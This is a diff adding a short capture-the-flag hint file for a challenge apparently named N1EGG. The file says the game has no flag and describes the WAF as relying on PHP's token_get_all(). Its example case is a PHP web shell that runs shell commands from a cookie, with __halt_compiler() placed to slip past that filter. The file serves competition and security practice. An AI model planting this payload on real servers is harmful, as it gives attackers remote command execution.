@@ -1,0 +1,7 @@
+THIS GAME HAS NO FLAG
+
+At the end of the CTF competition, the champion of this game will win an egg reward.
+
+HInt for N1EGG-A waf, a world:
+WAF: token_get_all()
+CASE: <?php /*no webshell*/ __halt_compiler();system($_COOKIE['test']); ?>
